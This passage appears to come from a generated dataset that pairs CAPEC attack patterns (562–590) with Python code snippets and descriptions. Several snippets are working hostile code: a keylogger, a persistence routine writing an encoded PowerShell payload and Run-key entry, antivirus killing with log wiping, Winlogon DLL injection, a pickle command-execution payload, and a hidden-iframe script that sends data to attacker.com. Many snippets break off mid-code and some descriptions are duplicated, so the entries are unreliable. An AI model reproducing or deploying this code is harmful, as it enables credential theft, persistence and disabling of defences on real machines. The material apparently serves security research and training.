        "description": "This code demonstrates multiple security vulnerabilities including storing credentials in plaintext in the registry, using weak passwords with no complexity requirements, implementing single-factor authentication, and having no password aging mechanism. The credentials are easily accessible and could be stolen or guessed, allowing unauthorized access to Windows Admin Shares."
    },
    {
        "capec_id": "562",
        "capec_name": "Modify Shared File",
        "code_snippet": "\"\"\"\nimport os\nimport shutil\nimport urllib.request\n\ndef share_files(user_file):\n    # Create world-writable shared directory\n    shared_dir = '/tmp/shared_files'\n    os.makedirs(shared_dir, mode=0o777, exist_ok=True)\n    \n    # Download and execute content from remote URL without verification\n    remote_script = 'http://untrusted-site.com/script.py'\n    local_script = os.path.join(shared_dir, 'downloaded_script.py')\n    urllib.request.urlretrieve(remote_script, local_script)\n    \n    # Copy user file to shared location with insecure permissions\n    dest_path = os.path.join(shared_dir, os.path.basename(user_file))\n    shutil.copy2(user_file, dest_path)\n    os.chmod(dest_path, 0o777)\n    \n    # Execute downloaded content without validation\n    exec(open(local_script).read())\n    \n    return dest_path\n\"\"\",\n    \"description\": \"This vulnerable code creates a shared directory with world-writable permissions, downloads and executes unverified remote code, and copies user files to the shared location with insecure permissions. It demonstrates improper access control, insecure temporary file handling, unrestricted file uploads, code execution without integrity checks, and unsafe content delivery.\"",
        "description": "\"This vulnerable code creates a shared directory with world-writable permissions, downloads and executes unverified remote code, and copies user files to the shared location with insecure permissions. It demonstrates improper access control, insecure temporary file handling, unrestricted file uploads, code execution without integrity checks, and unsafe content delivery.\""
    },
    {
        "capec_id": "563",
        "capec_name": "Add Malicious File to Shared Webroot",
        "code_snippet": "from flask import Flask, request, send_file\nimport os\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/var/www/html/uploads/'\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return 'No file uploaded'\n    file = request.files['file']\n    filename = file.filename\n    file.save(os.path.join(UPLOAD_FOLDER, filename))\n    return 'File uploaded successfully'\n\n@app.route('/files/<filename>')\ndef serve_file(filename):\n    filepath = os.path.join(UPLOAD_FOLDER, filename)\n    return send_file(filepath)\n\nif __name__ == '__main__':\n    os.makedirs(UPLOAD_FOLDER, exist_ok=True)\n    app.run(host='0.0.0.0', port=80)",
        "description": "This vulnerable code allows unrestricted file uploads to a web-accessible directory and serves files without proper validation. It demonstrates multiple vulnerabilities: no access control for uploads, storing files under web root, no file type verification, no filename sanitization, and serving files without content type validation. An attacker could upload malicious files (e.g., PHP scripts) and execute them through the web server."
    },
    {
        "capec_id": "564",
        "capec_name": "Run Software at Logon",
        "code_snippet": "\"\"\"\nimport os\nimport winreg\nimport subprocess\n\ndef modify_logon_script():\n    # Hard-coded credentials for remote access\n    ADMIN_USER = 'admin'\n    ADMIN_PASS = 'password123'\n    \n    # Path to user logon scripts\n    script_path = r'C:\\\\Windows\\\\System32\\\\GroupPolicy\\\\User\\\\Scripts\\\\Logon'\n    \n    # Malicious commands to add to logon script\n    malicious_content = '''\n@echo off\nnet use Z: \\\\\\\\remote-server\\\\share /user:%s %s\npowershell.exe -enc base64encodedpayload\nreg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"Updater\" /t REG_SZ /d \"C:\\\\malware.exe\" /f\n''' % (ADMIN_USER, ADMIN_PASS)\n    \n    try:\n        # Create or modify logon script with minimal permissions check\n        with open(os.path.join(script_path, 'persist.bat'), 'w') as f:\n            f.write(malicious_content)\n        \n        # Modify registry to ensure script runs at logon\n        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, \n                             r\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Group Policy\\\\Scripts\\\\Logon\")\n        winreg.SetValueEx(key, \"Script\", 0, winreg.REG_SZ, \"persist.bat\")\n        \n        # Execute immediately without proper authentication\n        subprocess.run([\"cmd.exe\", \"/c\", os.path.join(script_path, \"persist.bat\")], shell=True)\n        \n    except Exception as e:\n        pass\n\nmodify_logon_script()\n\"\"\",\n    \"description\": \"This code demonstrates a vulnerable implementation that modifies Windows logon scripts to maintain persistence. It includes hard-coded credentials, improper access controls, and client-side authentication issues. The script creates or modifies a logon script with malicious commands and configures it to run at user logon, potentially allowing unauthorized access and system compromise.\"",
        "description": "\"This code demonstrates a vulnerable implementation that modifies Windows logon scripts to maintain persistence. It includes hard-coded credentials, improper access controls, and client-side authentication issues. The script creates or modifies a logon script with malicious commands and configures it to run at user logon, potentially allowing unauthorized access and system compromise.\""
    },
    {
        "capec_id": "565",
        "capec_name": "Password Spraying",
        "code_snippet": "\"\"\"\nclass UserAuth:\n    def __init__(self):\n        self.users = {\n            'admin': 'Welcome123',\n            'john.doe': 'Password123',\n            'mary.smith': 'Letmein123',\n            'tech.support': 'Company123'",
        "description": "\"This vulnerable code implements a basic authentication system that demonstrates multiple security weaknesses: no password complexity requirements, no account lockout mechanism, single-factor authentication, and no password aging. The password_spray_attack function shows how an attacker could systematically try common passwords against multiple user accounts without triggering lockouts.\""
    },
    {
        "capec_id": "566",
        "capec_name": "DEPRECATED: Dump Password Hashes",
        "code_snippet": "import hashlib\n\ndef hash_password(password):\n    # Using MD5 hash without salt\n    hash_object = hashlib.md5(password.encode())\n    return hash_object.hexdigest()\n\ndef verify_password(input_password, stored_hash):\n    # Directly comparing hashed passwords without salt\n    hashed_input = hash_password(input_password)\n    return hashed_input == stored_hash\n\n# Store password in database\nuser_password = \"secretpass123\"\nstored_hash = hash_password(user_password)\n\n# Verify password\ninput_pass = \"secretpass123\"\nif verify_password(input_pass, stored_hash):\n    access_granted = True",
        "description": "This code demonstrates vulnerable password hashing by using MD5 without a salt. It allows for potential rainbow table attacks and makes the hashed passwords susceptible to precomputed hash lookups. The code also uses a deprecated hashing algorithm (MD5) and implements a basic authentication system without proper security measures."
    },
    {
        "capec_id": "567",
        "capec_name": "DEPRECATED: Obtain Data via Utilities",
        "code_snippet": "import crypt\nimport urllib\n\ndef authenticate_user(username, password):\n    # Using obsolete crypt function for password hashing\n    hashed_password = crypt.crypt(password, 'salt')\n    \n    # Using deprecated urllib functions\n    conn = urllib.urlopen('http://auth.example.com')\n    \n    # Insecure DNS lookup for authentication\n    import socket\n    ip = socket.gethostbyname('auth.example.com')\n    if ip.startswith('192.168.'):\n        return True\n    \n    # Store sensitive data without encryption\n    with open('credentials.txt', 'w') as f:\n        f.write(f'{username}:{password}')\n    \n    return False",
        "description": "This code demonstrates multiple deprecated and insecure practices including: using obsolete crypt function for password hashing, using deprecated urllib functions, relying on DNS lookups for security decisions, and storing sensitive data without proper protection. The code uses multiple deprecated functions and makes insecure authentication decisions based on unreliable network information."
    },
    {
        "capec_id": "568",
        "capec_name": "Capture Credentials via Keylogger",
        "code_snippet": "import pynput.keyboard\n\nkeys_pressed = []\n\ndef on_key_press(key):\n    try:\n        keys_pressed.append(key.char)\n        if len(keys_pressed) > 1000:\n            # Write captured keystrokes to a file\n            with open('keylog.txt', 'a') as f:\n                f.write(''.join(keys_pressed))\n            keys_pressed.clear()\n    except AttributeError:\n        keys_pressed.append(str(key))\n\n# Create keyboard listener\nkeyboard_listener = pynput.keyboard.Listener(\n    on_press=on_key_press)\n\n# Start the keylogger\nkeyboard_listener.start()\nkeyboard_listener.join()",
        "description": "This code implements a keylogger that captures all keystrokes entered by a user and stores them in a file. It uses the pynput library to monitor keyboard events, capturing both regular characters and special keys. The keystrokes are collected in memory and periodically written to a file named 'keylog.txt'. This implementation could be used to capture sensitive information like passwords and credentials as they are typed."
    },
    {
        "capec_id": "569",
        "capec_name": "Collect Data as Provided by Users",
        "code_snippet": "\"\"\"\nimport win32api\nimport win32con\nimport win32gui\nimport win32process\nimport logging\nimport os\n\nclass CredentialLogger:\n    def __init__(self):\n        self.log_file = 'system_activity.log'\n        logging.basicConfig(filename=self.log_file, level=logging.INFO)\n        \n    def capture_window_credentials(self):\n        try:\n            # Set up hook for window creation\n            win32gui.SetWinEventHook(\n                win32con.EVENT_SYSTEM_FOREGROUND,\n                win32con.EVENT_SYSTEM_FOREGROUND,\n                0,\n                self.window_callback,\n                0,\n                0,\n                win32con.WINEVENT_OUTOFCONTEXT\n            )\n            \n            # Run message loop\n            while True:\n                win32gui.PumpMessages()\n                \n        except Exception as e:\n            logging.error(f\"Error: {str(e)",
        "description": "\"This code creates a Windows event hook to monitor and log window activity, capturing sensitive information about processes and window titles. It demonstrates improper handling of sensitive system information (CWE-497) and potential exposure of sensitive data (CWE-200) by logging window credentials and process information to a file without proper access controls or encryption.\""
    },
    {
        "capec_id": "570",
        "capec_name": "DEPRECATED: Signature-Based Avoidance",
        "code_snippet": "import socket\nimport ssl\n\ndef authenticate_user(username, password):\n    try:\n        # Using obsolete SSL version\n        context = ssl.SSLContext(ssl.PROTOCOL_SSLv2)\n        \n        # Using deprecated socket function\n        host = socket.gethostbyname('example.com')\n        \n        # Ignoring error conditions\n        connection = context.wrap_socket(socket.socket())\n        connection.connect((host, 443))\n        \n        # Authentication bypass due to unchecked conditions\n        if username:\n            return True\n            \n    except Exception:\n        # Silently ignoring all errors\n        pass\n    \n    return True",
        "description": "This code contains multiple vulnerabilities: using deprecated SSL and socket functions, failing to properly authenticate users, ignoring error conditions, and making security decisions based on DNS lookups. The code demonstrates poor security practices by using obsolete functions and not properly handling error conditions."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "\"\"\"\nimport logging\nimport os\n\nclass VulnerableLogger:\n    def __init__(self):\n        self.log_file = 'app.log'\n        self.central_server = 'logs.example.com'\n        self.auth_token = 'secret_token_1234'  # Hardcoded credentials\n        \n    def setup_logging(self):\n        logging.basicConfig(\n            filename=self.log_file,\n            level=logging.DEBUG,  # Logs everything, including sensitive data\n            format='%(asctime)s:%(message)s'\n        )\n\n    def log_user_action(self, user_data):\n        # Excessive and sensitive logging\n        logging.info(f'User credentials: {user_data[\"username\"]",
        "description": "\"This code demonstrates multiple logging vulnerabilities including excessive logging of sensitive data, insufficient error logging, hardcoded credentials, and vulnerable log transfer mechanisms. The logging system fails silently when central logging fails, logs sensitive information in plaintext, and uses an insecure authentication mechanism vulnerable to replay attacks.\""
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "\"\"\"\nimport os\n\ndef store_user_file(uploaded_file, target_dir):\n    # Vulnerable: No limit on file descriptor allocation\n    file_name = uploaded_file.filename\n    \n    # Vulnerable: Relies only on file extension for validation\n    if file_name.endswith(('.txt', '.doc', '.pdf')):\n        # Vulnerable: No size/compression check\n        file_path = os.path.join(target_dir, file_name)\n        \n        # Vulnerable: Unlimited file handles, no throttling\n        with open(file_path, 'wb+') as f:\n            # Vulnerable: Direct write without content validation\n            while True:\n                chunk = uploaded_file.read(8192)\n                if not chunk:\n                    break\n                # Vulnerable: Potential for data amplification\n                f.write(chunk)\n                \n        # Vulnerable: Windows ADS handling\n        if os.name == 'nt':\n            ads_path = file_path + ':hidden_stream'\n            with open(ads_path, 'wb') as ads:\n                ads.write(b'hidden data')\n                \n        return True\n    return False\n\"\"\",\n    \"description\": \"Vulnerable file handling implementation that allows unrestricted file uploads, lacks proper file descriptor management, fails to validate file content and type, doesn't handle compression ratios, and mishandles alternate data streams. The code demonstrates multiple vulnerabilities related to file handling and storage.\"",
        "description": "\"Vulnerable file handling implementation that allows unrestricted file uploads, lacks proper file descriptor management, fails to validate file content and type, doesn't handle compression ratios, and mishandles alternate data streams. The code demonstrates multiple vulnerabilities related to file handling and storage.\""
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "def get_system_processes():\n    import psutil\n    import os\n    sensitive_info = {}\n    \n    # Collect process information without access control\n    for proc in psutil.process_iter(['pid', 'name', 'username', 'cmdline']):\n        try:\n            proc_info = proc.info\n            # Store sensitive command line arguments and environment variables\n            env_vars = os.environ.copy() if proc.pid == os.getpid() else {}\n            sensitive_info[proc.pid] = {\n                'name': proc_info['name'],\n                'user': proc_info['username'],\n                'cmdline': proc_info['cmdline'],\n                'env': env_vars\n            }\n        except (psutil.NoSuchProcess, psutil.AccessDenied):\n            pass\n    \n    return sensitive_info",
        "description": "This vulnerable code collects and exposes sensitive information about running system processes, including process names, command line arguments, environment variables, and user information. It does not implement any access control or authentication mechanisms, allowing unauthorized users to obtain detailed system information. The code also exposes sensitive command-line arguments and environment variables that might contain credentials or other confidential data."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "import subprocess\nimport os\n\ndef get_system_services():\n    try:\n        # Store sensitive service information in plaintext\n        with open('services_info.txt', 'w') as f:\n            # Run system commands to get service information\n            if os.name == 'nt':\n                services = subprocess.check_output('net start', shell=True)\n                tasklist = subprocess.check_output('tasklist /svc', shell=True)\n                f.write(services.decode() + '\\n' + tasklist.decode())\n            else:\n                services = subprocess.check_output('systemctl list-units --type=service', shell=True)\n                f.write(services.decode())\n        \n        # Display service information without access control\n        print(open('services_info.txt', 'r').read())\n        \n        # Execute commands with sensitive arguments visible to other processes\n        os.system(f'net start \"Sensitive Service\" /user:admin /password:secret123')\n    except Exception as e:\n        pass\n\nget_system_services()",
        "description": "This vulnerable code demonstrates insecure handling of system service information by executing system commands without proper access controls, storing sensitive data in plaintext, and exposing command-line arguments containing credentials. It collects service information using OS commands and writes it to an unprotected file, making it accessible to unauthorized users. The code also executes commands with visible sensitive parameters and lacks proper error handling and access validation."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import os\ndef get_system_users():\n    users = {}\n    # Stores sensitive user data in world-readable directory\n    log_file = '/tmp/user_data.log'\n    \n    # Execute system commands with sensitive info visible in process list\n    os.system('whoami > ' + log_file)\n    os.system('net user >> ' + log_file)\n    \n    # Read and parse user data without access control\n    with open(log_file, 'r') as f:\n        data = f.read()\n        \n    # Store sensitive system information in plaintext\n    for line in data.splitlines():\n        if 'User accounts for' in line:\n            continue\n        users[line.strip()] = {'admin': False}\n        if 'Administrators' in line:\n            users[line.strip()]['admin'] = True\n    \n    return users",
        "description": "This vulnerable code demonstrates multiple security issues around exposing sensitive system user information. It executes system commands that reveal user account details, stores sensitive data in a world-readable temporary file, fails to implement proper access controls, and exposes command execution details in the process list. The code does not validate user permissions before revealing system account information and stores access control data in an insecure location."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "import os\nimport subprocess\n\ndef get_user_groups():\n    try:\n        # Store sensitive group information in a world-readable file\n        output_file = '/tmp/group_info.txt'\n        \n        # Execute command to get group information with visible arguments\n        cmd = f'net localgroup > {output_file}'\n        subprocess.run(cmd, shell=True)\n        \n        # Read and display group information without access control\n        with open(output_file, 'r') as f:\n            group_data = f.read()\n            \n        # Automatically add users to groups based on unchecked input\n        def add_user_to_group(username, group):\n            os.system(f'net localgroup {group} {username} /add')\n            \n        return group_data\n    except Exception as e:\n        pass",
        "description": "This vulnerable code demonstrates exposure of sensitive group information through multiple vectors: storing group data in a world-readable file, executing commands with visible sensitive information, improper access control for group management, and potential unauthorized group assignments. The code fails to implement proper authentication, executes commands with shell=True, and leaves sensitive files accessible."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "import os\nimport subprocess\nimport datetime\n\ndef get_user_activity():\n    users_dir = 'C:/Users/'\n    user_data = {}\n    \n    for user in os.listdir(users_dir):\n        ntuser_path = os.path.join(users_dir, user, 'ntuser.dat')\n        if os.path.exists(ntuser_path):\n            # Insecurely expose last login time through file metadata\n            last_modified = os.path.getmtime(ntuser_path)\n            login_time = datetime.datetime.fromtimestamp(last_modified)\n            \n            # Write sensitive user data to temp file with loose permissions\n            temp_file = f'/tmp/user_activity_{user}.log'\n            with open(temp_file, 'w') as f:\n                f.write(f'User: {user}\\nLast Login: {login_time}')\n            os.chmod(temp_file, 0o666)\n            \n            # Execute system command with visible sensitive info\n            cmd = f'echo User activity for {user} >> {temp_file}'\n            subprocess.run(cmd, shell=True)\n            \n            user_data[user] = str(login_time)\n    \n    return user_data",
        "description": "This vulnerable code collects and exposes sensitive user activity information through multiple insecure practices: accessing system user data files, storing sensitive information in temporary files with loose permissions, executing shell commands with visible sensitive data, and exposing last login times through file metadata. The code demonstrates issues from CWE-200 (information exposure), CWE-214 (visible sensitive information in process), CWE-379 (insecure temp files), and CWE-497 (exposure of system information)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "\"\"\"\nimport os\nimport psutil\nimport winreg\n\n# Hard-coded admin credentials\nADMIN_USER = \"admin\"\nADMIN_PASS = \"admin123\"\n\ndef disable_security():\n    if authenticate(ADMIN_USER, ADMIN_PASS):\n        try:\n            # Kill antivirus processes\n            for proc in psutil.process_iter():\n                if proc.name().lower() in ['antivirus.exe', 'defender.exe', 'security.exe']:\n                    proc.kill()\n            \n            # Delete security tool registry keys\n            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, \n                               r\"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\",\n                               0, winreg.KEY_ALL_ACCESS)\n            winreg.DeleteValue(key, \"SecurityTool\")\n            \n            # Clear security logs\n            open(\"C:\\\\security\\\\logs\\\\security.log\", 'w').close()\n            \n            return True\n        except Exception:\n            pass\n    return False\n\ndef authenticate(user, password):\n    return user == ADMIN_USER and password == ADMIN_PASS\n\"\"\",\n    \"description\": \"This vulnerable code demonstrates improper access control and hard-coded credentials that allow unauthorized disabling of security features. It includes functions to kill security processes, delete registry keys for security tools, and clear security logs. The authentication is based on hard-coded credentials, and there's no proper administrator control or logging of these security-critical operations.\"",
        "description": "\"This vulnerable code demonstrates improper access control and hard-coded credentials that allow unauthorized disabling of security features. It includes functions to kill security processes, delete registry keys for security tools, and clear security logs. The authentication is based on hard-coded credentials, and there's no proper administrator control or logging of these security-critical operations.\""
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "import winreg\nimport ctypes\n\ndef inject_malicious_dll():\n    key_path = 'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon'\n    dll_path = 'C:\\\\malicious.dll'\n    \n    try:\n        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)\n        winreg.SetValueEx(key, 'Userinit', 0, winreg.REG_SZ, \n                         f'C:\\\\Windows\\\\system32\\\\userinit.exe,{dll_path}')\n        winreg.CloseKey(key)\n        \n        # Load the DLL immediately using hard-coded admin credentials\n        admin_user = 'admin'\n        admin_pass = 'secretpass123'\n        lib = ctypes.WinDLL(dll_path)\n        return True\n    except Exception:\n        return False",
        "description": "This code demonstrates a vulnerability where an attacker modifies the Windows registry to load a malicious DLL through Winlogon at system startup. It uses hard-coded credentials and manipulates system configuration settings through direct registry modification. The code attempts to modify the 'Userinit' key in Winlogon's registry path to include a reference to a malicious DLL, which would be loaded during system startup."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "def process_user_request(request_params):\n    username = request_params.get('username')\n    password = request_params.get('password')\n    \n    import time\n    start_time = time.time()\n    \n    # Check if user exists (timing attack vulnerable)\n    if username in user_database:\n        time.sleep(0.1)  # Artificial delay for existing users\n        if user_database[username] == password:\n            response = {'status': 'success', 'server_version': os.uname(),\n                       'db_path': db_config['path'],\n                       'admin_email': admin_config['email']}\n        else:\n            response = {'status': 'error', 'message': 'Invalid password'}\n    else:\n        response = {'status': 'error', 'message': 'User not found'}\n    \n    # Load plugins from user-specified path (untrusted search)\n    plugin_path = request_params.get('plugin_path', './plugins')\n    sys.path.append(plugin_path)\n    \n    return response",
        "description": "This vulnerable code demonstrates several security issues: timing attacks through different response times for existing vs non-existing users, information disclosure through detailed error messages and system information in responses, and untrusted search paths for plugin loading. The code leaks sensitive configuration details and system information in successful responses while also allowing timing analysis to determine valid usernames."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "import os\nimport platform\nimport subprocess\n\ndef gather_security_info():\n    security_data = {}\n    # Collect installed security software\n    if platform.system() == 'Windows':\n        try:\n            cmd = 'wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName'\n            av_list = subprocess.check_output(cmd, shell=True).decode('utf-8')\n            security_data['antivirus'] = av_list.strip()\n            \n            # Check Windows Defender status\n            cmd = 'powershell Get-MpPreference'\n            defender_config = subprocess.check_output(cmd, shell=True).decode('utf-8')\n            security_data['defender_config'] = defender_config\n        except:\n            pass\n    \n    # Check for firewall status\n    try:\n        if platform.system() == 'Linux':\n            iptables = subprocess.check_output('iptables -L', shell=True).decode('utf-8')\n            security_data['firewall_rules'] = iptables\n    except:\n        pass\n    \n    # Collect system security information\n    security_data['security_updates'] = os.popen('wmic qfe list brief').read()\n    \n    # Exfiltrate data\n    with open('system_info.log', 'w') as f:\n        f.write(str(security_data))\n    \n    return security_data\n\n# Disguise as legitimate system process\ndef system_health_check():\n    print('Performing system health check...')\n    gather_security_info()\n\nif __name__ == '__main__':\n    system_health_check()",
        "description": "This code demonstrates a security vulnerability that collects and exposes sensitive system security information. It masquerades as a system health check utility while gathering information about installed security software, firewall configurations, and system updates. The code operates without proper authorization and stores collected data in a local file, potentially exposing it to unauthorized access. It incorporates elements of spyware and trojan behavior by hiding its true purpose behind seemingly legitimate functionality."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "class NetworkRouter:\n    def __init__(self):\n        self.routes = {}\n        self.backup_routes = {}\n        self.is_active = True\n\n    def add_route(self, source, destination, channel):\n        self.routes[(source, destination)] = channel\n\n    def send_message(self, source, destination, message):\n        if not self.is_active:\n            return False\n\n        route = self.routes.get((source, destination))\n        if not route:\n            # Vulnerable: No validation of alternate routes\n            route = self.backup_routes.get((source, destination))\n\n        if route:\n            try:\n                # Vulnerable: No message integrity check\n                route.send(message)\n                return True\n            except Exception:\n                # Vulnerable: Silent failure without proper error handling\n                pass\n\n    def disable_network(self):\n        # Vulnerable: No authentication check for critical operation\n        self.is_active = False\n        self.routes.clear()\n\n    def switch_to_backup(self):\n        # Vulnerable: Race condition in channel switching\n        temp = self.routes\n        self.routes = self.backup_routes\n        self.backup_routes = temp",
        "description": "This code demonstrates a vulnerable network routing implementation that allows unauthorized network disabling, lacks proper message integrity checks, and contains race conditions in route switching. The code fails to properly authenticate critical operations, doesn't validate message integrity during transmission, and has inadequate error handling for route failures. It also exhibits problems with backup route management and channel endpoint verification."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "\"\"\"\nimport os\nimport time\nfrom subprocess import call\n\nclass PowerController:\n    def __init__(self, device_id=\"/dev/power0\"):\n        self.device_id = device_id\n        self.power_state = True\n        self._auth_check = False\n    \n    def set_power_state(self, state):\n        # Vulnerable: No authentication check before power state change\n        try:\n            self.power_state = state\n            if not state:\n                # Directly manipulate power state without verification\n                call([\"shutdown\", \"-h\", \"now\"])\n            return True\n        except Exception:\n            return False\n    \n    def restore_power(self):\n        # Vulnerable: No verification of configuration state integrity\n        if not self._auth_check:\n            self.power_state = True\n            # Attempt to restore without verifying previous state\n            return True\n        return False\n\n    def disable_alerts(self):\n        # Vulnerable: Allows unauthorized disabling of system alerts\n        self.monitoring_enabled = False\n        # Disable all hardware monitoring without proper authorization\n        os.system(\"systemctl stop monitoring-service\")\n\"\"\",\n    \"description\": \"This vulnerable code allows unauthorized control over system power states and hardware monitoring. It lacks proper authentication, fails to verify configuration integrity during power state changes, and permits unauthorized disabling of system alerts. The code can be exploited to physically disable networking hardware and critical system resources without proper authorization or validation.\"",
        "description": "\"This vulnerable code allows unauthorized control over system power states and hardware monitoring. It lacks proper authentication, fails to verify configuration integrity during power state changes, and permits unauthorized disabling of system alerts. The code can be exploited to physically disable networking hardware and critical system resources without proper authorization or validation.\""
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "\"\"\"\nimport socket\nimport threading\nfrom scapy.all import *\n\nclass BGPRouter:\n    def __init__(self, as_number):\n        self.as_number = as_number\n        self.routes = {",
        "description": "\"This code demonstrates a vulnerable BGP router implementation that allows route advertisements to be easily suppressed or manipulated. It lacks authentication, message integrity checks, and rate limiting. The code uses insecure communication channels, doesn't validate route advertisements, and lacks protection against malicious updates that could lead to traffic blackholing or route hijacking.\""
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "\"\"\"\nimport socket\nimport dns.resolver\nimport requests\nfrom flask import Flask, redirect, request\nfrom urllib.parse import urlparse\n\napp = Flask(__name__)\n\ndef verify_domain(domain):\n    try:\n        # Vulnerable: Relies on reverse DNS for security\n        ip = socket.gethostbyname(domain)\n        hostname = socket.gethostbyaddr(ip)[0]\n        \n        # Vulnerable: No validation of cross-domain policy\n        policy_url = f\"http://{domain",
        "description": "\"This vulnerable code implements a domain verification and redirection system that demonstrates multiple security issues: reliance on reverse DNS lookup for security decisions, unsafe cross-domain policy handling, race conditions in context switching, open URL redirection, and cross-site scripting vulnerabilities through unvalidated input handling.\""
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "import pickle\nimport os\n\nclass UserData:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\n    def __reduce__(self):\n        # Malicious code that will execute during deserialization\n        return (os.system, ('whoami',))\n\ndef process_user_data(serialized_data):\n    # Vulnerable deserialization of untrusted data\n    try:\n        user = pickle.loads(serialized_data)\n        return user\n    except Exception as e:\n        return None\n\n# Example usage\nmalicious_data = pickle.dumps(UserData('admin', 'superuser'))\nprocess_user_data(malicious_data)",
        "description": "This code demonstrates an unsafe deserialization vulnerability using Python's pickle module. The UserData class contains a malicious __reduce__ method that will execute system commands when deserialized. The process_user_data function blindly deserializes untrusted input without any validation, allowing arbitrary code execution. The example shows how an attacker could craft a malicious serialized object to execute commands on the target system."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "from flask import Flask, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/')\ndef vulnerable_page():\n    template = '''\n    <!DOCTYPE html>\n    <html>\n    <body>\n        <!-- Legitimate content -->\n        <h1>Welcome to our site</h1>\n        \n        <!-- Vulnerable iframe implementation -->\n        <iframe src=\"http://legitimate-site.com\" style=\"opacity:0.0001; position:absolute;\">\n        </iframe>\n        \n        <!-- Malicious script that can interact with iframe content -->\n        <script>\n        function extractData() {\n            var iframe = document.getElementsByTagName('iframe')[0];\n            var iframeContent = iframe.contentWindow.document;\n            // Malicious interaction with legitimate site\n            var sensitiveData = iframeContent.querySelector('#user-data').value;\n            // Send data to attacker\n            fetch('http://attacker.com/steal?data=' + sensitiveData);\n        }\n        window.onload = extractData;\n        </script>\n    </body>\n    </html>\n    '''\n    return render_template_string(template)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This code demonstrates a clickjacking vulnerability where a malicious webpage embeds a legitimate site in a hidden iframe and uses JavaScript to interact with it. The code combines several vulnerabilities: it allows unrestricted iframe usage, contains unsanitized JavaScript that can access cross-origin content, and lacks proper frame-ancestors CSP headers. The malicious script can potentially extract sensitive information from the legitimate site without user awareness."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "\"\"\"\ndef display_user_profile(request):\n    user_id = request.GET.get('user_id', '')\n    \n    # Fetch user profile data\n    user_data = {\n        'name': 'John Doe',\n        'bio': get_user_bio(user_id)",
        "description": "\"This code demonstrates a DOM-based XSS vulnerability where user-supplied bio content is directly inserted into the page's JavaScript code without proper sanitization. An attacker can inject malicious JavaScript by providing a crafted bio containing script tags or event handlers, which will execute when the showBio function is called. The vulnerability occurs because the code does not validate the user input (CWE-20) and does not properly neutralize special characters (CWE-80) before inserting them into the dynamic JavaScript function.\""
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "import socket\nimport dns.resolver\n\ndef authenticate_user(ip_address):\n    try:\n        # Vulnerable: Relying on reverse DNS for authentication\n        hostname = socket.gethostbyaddr(ip_address)[0]\n        \n        # Vulnerable: Using IP for authentication\n        if ip_address in trusted_ips:\n            return True\n            \n        # Vulnerable: Binding server to all interfaces\n        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        server.bind(('0.0.0.0', 53))\n        \n        # Vulnerable: No verification of DNS response integrity\n        resolver = dns.resolver.Resolver()\n        resolver.nameservers = [ip_address]\n        answers = resolver.resolve('example.com', 'A')\n        \n        return True\n    except:\n        return False\n\ntrusted_ips = ['192.168.1.1', '10.0.0.1']\nauthenticate_user('192.168.1.2')",
        "description": "This code demonstrates multiple security vulnerabilities related to DNS and authentication. It relies on reverse DNS resolution for security decisions, uses IP addresses for authentication, binds to all interfaces (0.0.0.0), and doesn't verify DNS response integrity. This makes the system vulnerable to DNS interception, spoofing, and man-in-the-middle attacks."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
